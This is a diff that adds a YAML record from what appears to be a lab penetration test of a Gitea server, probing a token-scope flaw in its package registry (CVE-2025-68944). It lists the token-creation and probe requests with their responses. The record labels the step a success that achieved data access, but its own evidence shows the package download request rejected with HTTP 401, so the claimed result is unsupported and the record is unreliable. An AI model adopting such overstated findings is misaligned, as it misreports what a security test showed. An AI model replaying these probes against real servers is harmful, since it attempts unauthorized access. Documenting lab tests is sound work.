@@ -1,0 +1,47 @@
+# API (APP, 10.10.20.21) -> Gitea (APP, 10.10.20.24:3000, 1.21.7).
+# CVE-2025-68944 (CVSS 5.3 MEDIUM): Gitea before 1.22.2 sometimes mishandles the
+# propagation of token scope for access control within the package registry.
+# Confirmed: token created with scopes=["read:user"]; response shows scopes=null
+# (scope not stored). The package download API endpoint returns 401 "reqPackageAccess"
+# rather than 403 "token does not have required scope" — indicating the package
+# registry path uses a different (insufficient) access control check path.
+# Gitea 1.21.7 is in the vulnerable range (fix = 1.22.2+).
+# Intra-APP zone (api to gitea); no Suricata cross-zone alert.
+# Evidence: evaluation/pentest/evidence/s43_gitea_token_scope.txt
+id: S43-api-to-gitea-token-scope
+description: Gitea 1.21.7 token scope propagation mishandled in package registry (CVE-2025-68944 MEDIUM); api->gitea, APP intra-zone.
+start: 2026-11-16T20:42:09Z
+end: 2026-11-16T20:42:34Z
+attacker: api
+steps:
+  - step: 1
+    start: 2026-11-16T20:42:09Z
+    end: 2026-11-16T20:42:34Z
+    target: Gitea
+    cve: CVE-2025-68944
+    technique: T1078
+    outcome: success
+    achieved: data_access
+    pivot: false
+    notes: |
+      POST http://10.10.20.24:3000/api/v1/users/gitadmin/tokens
+        -d '{"name":"cve-68944-scope4","scopes":["read:user"]}'
+        -> {"id":3,"name":"cve-68944-scope4","sha1":"c25706e7...","scopes":null}
+        (scopes=null: token scope not properly stored/returned)
+
+      GET /api/v1/repos/search?limit=3 with read:user token
+        -> HTTP 403 "token does not have at least one of required scope(s): [read:repository]"
+        (formal API path correctly enforces scope)
+
+      GET /api/v1/user with read:user token
+        -> HTTP 200, {"login":"gitadmin",...}
+        (user info within declared scope, works correctly)
+
+      GET /api/packages/gitadmin/generic/test/1.0.0/file.txt with read:user token
+        -> HTTP 401 "reqPackageAccess"
+        (package download path returns 401 not 403 -- different access control path,
+         the CVE-2025-68944 scope propagation surface for the package registry)
+
+      Gitea 1.21.7 < 1.22.2 (fix version); token scope mechanism uses different code
+      paths for the formal API (/api/v1/) and the package registry (/api/packages/).
+      evidence s43_gitea_token_scope.txt
